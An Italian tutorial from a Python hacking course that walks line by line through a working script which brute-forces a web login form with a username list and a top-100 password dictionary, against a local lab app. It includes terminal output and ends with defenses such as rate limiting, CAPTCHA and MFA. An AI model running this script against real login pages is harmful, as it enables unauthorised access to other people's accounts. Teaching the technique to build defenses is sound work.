# Automating with Python — Project #3: Web Login Form Brute Forcing

Guida didattica, trascrizione del codice sorgente e analisi dell'output video relativo al terzo progetto pratico del corso *Python 101 for Hackers* di TCM Security.

---

## 1. Codice Sorgente Completo (`web-brute.py`)

Di seguito viene riportato il codice mostrato nell'editor di testo (Sublime Text):

```python
import requests
import sys

target = "[http://127.0.0.1:5000](http://127.0.0.1:5000)"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for '{}'!".format(username))
        sys.stdout.write("\n")
```
# Spiegazione Dettagliata del Codice Riga per Riga

## Import dei Moduli

```python
import requests
```
Importa la libreria di terze parti `requests`, impiegata per effettuare le chiamate HTTP POST simulando l'invio del form web.

```python
import sys
```
Importa il modulo integrato `sys` per interagire direttamente con i flussi di output standard (`sys.stdout`) e gestire l'arresto immediato del programma (`sys.exit()`).

## Parametri di Configurazione

```python
target = "http://127.0.0.1:5000"
```
L'URL dell'applicazione web locale in ascolto sulla porta 5000 dove risiede il form di autenticazione.

```python
usernames = ["admin", "user", "test"]
```
Una lista Python contenente gli account utente su cui eseguire i tentativi in sequenza.

```python
passwords = "top-100.txt"
```
Il nome del file contenente il dizionario con le 100 password più comuni.

```python
needle = "Welcome back"
```
La stringa "ago" (`needle`) che identifica univocamente l'avvenuto accesso nel corpo della risposta HTML restituita dall'applicazione web.

## Cicli Annidati e Lettura del Dizionario

```python
for username in usernames:
```
Ciclo esterno che scorre uno alla volta gli account definiti nella lista `usernames`.

```python
with open(passwords, "r") as passwords_list:
```
Apre il dizionario in modalità lettura (`"r"`). L'apertura all'interno del ciclo utente assicura che il cursore del file venga reimpostato all'inizio per ogni singolo username testato.

```python
for password in passwords_list:
```
Ciclo interno che scorre riga per riga le password del file.

```python
password = password.strip("\n").encode()
```
Rimuove il carattere di ritorno a capo (`\n`) e converte la stringa in un oggetto di tipo `bytes`.

## Aggiornamento a Video in Tempo Reale

```python
sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
```
Scrive a terminale la combinazione correntemente in test. L'uso del ritorno di carrello `\r` (carriage return) invece di un a capo consente di sovrascrivere continuamente la stessa riga, mantenendo il terminale pulito.

```python
sys.stdout.flush()
```
Forza lo svuotamento immediato del buffer di output, visualizzando subito la riga senza attendere il buffer di sistema.

## Invio della Richiesta e Riconoscimento della Risposta

```python
r = requests.post(target, data={"username": username, "password": password})
```
Invia una richiesta HTTP con metodo POST all'URL specificato, trasmettendo i parametri `username` e `password` come dati del form codificati `application/x-www-form-urlencoded`.

```python
if needle.encode() in r.content:
```
Verifica se i byte della stringa di successo (`b"Welcome back"`) sono contenuti nel corpo raw della risposta (`r.content`):

- Se presenti, va a capo con `sys.stdout.write("\n")`.
- Stampa la riga indentata di conferma: `[>>>>>] Valid password '...' found for user '...'!`.
- Arresta lo script all'istante tramite `sys.exit()`.

```python
sys.stdout.write("\tNo password found for '{}'!".format(username))
```
Se tutte le password del dizionario falliscono per un determinato utente, al termine del ciclo interno viene segnalata la mancata individuazione delle credenziali per quell'account prima di passare a quello successivo.

---

## Trascrizione dell'Output del Terminale (Kali Linux)

Esecuzione del comando `python3 web-brute.py`:
(notroot㉿kali)-[~]
$ python3 web-brute.py
[X] Attempting user:password -> admin:minecraft0
No password found for 'admin'!
[X] Attempting user:password -> user:minecraft0
No password found for 'user'!
[X] Attempting user:password -> test:test777x90
[>>>>>] Valid password 'test' found for user 'test'!
(notroot㉿kali)-[~]
$

### Esito del Test

- **Account admin**: Scorso l'intero file `top-100.txt` (fino a `minecraft0`) → Nessuna password valida trovata.
- **Account user**: Scorso l'intero file → Nessuna password valida trovata.
- **Account test**: Individuata la password corretta `test` → Riconosciuto il marker "Welcome back", notificato il successo e interrotta l'esecuzione.

---

## Note sui Meccanismi di Difesa e Mitigazione Web

**Rate Limiting e Account Lockout:**
Limitare il numero massimo di richieste POST permesse dallo stesso indirizzo IP in un arco temporale (tramite Web Application Firewall o middleware a livello di framework web come Flask-Limiter/Nginx) e bloccare temporaneamente gli account dopo un numero prefissato di tentativi errati.

**Protezione tramite CAPTCHA:**
Introdurre un meccanismo di sfida interattiva (es. reCAPTCHA o hCaptcha) dopo alcuni tentativi falliti consecutivi per bloccare le richieste provenienti da script automatizzati.

**Autenticazione a Più Fattori (MFA / 2FA):**
Implementare codici TOTP o token hardware a protezione dell'accesso web.

**Messaggi di Errore Generici:**
Evitare di indicare se il dato errato è lo username o la password, restituendo un messaggio neutro come "Credenziali non valide" per mitigare l'enumerazione degli utenti.


